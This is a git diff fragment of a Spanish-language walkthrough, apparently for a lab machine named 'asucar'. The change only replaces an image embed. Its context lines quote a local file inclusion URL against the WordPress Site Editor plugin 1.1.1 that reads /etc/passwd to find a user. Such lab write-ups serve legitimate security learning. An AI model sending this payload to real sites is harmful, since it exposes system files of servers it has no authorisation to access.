@@ -225,7 +225,8 @@ Investigando sobre el plugin, confirmamos que **la versión 1.1.1** contiene una
 http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
 ```
 
-![[asucar maquina.png]]
+<img width="1912" height="240" alt="Image" src="https://github.com/user-attachments/assets/fefca116-4826-41f3-95bd-80e5c013d3f4" />
+
 
 Esto nos permite leer archivos arbitrarios del sistema. De hecho, el archivo `/etc/passwd` nos revela un usuario interesante:
 
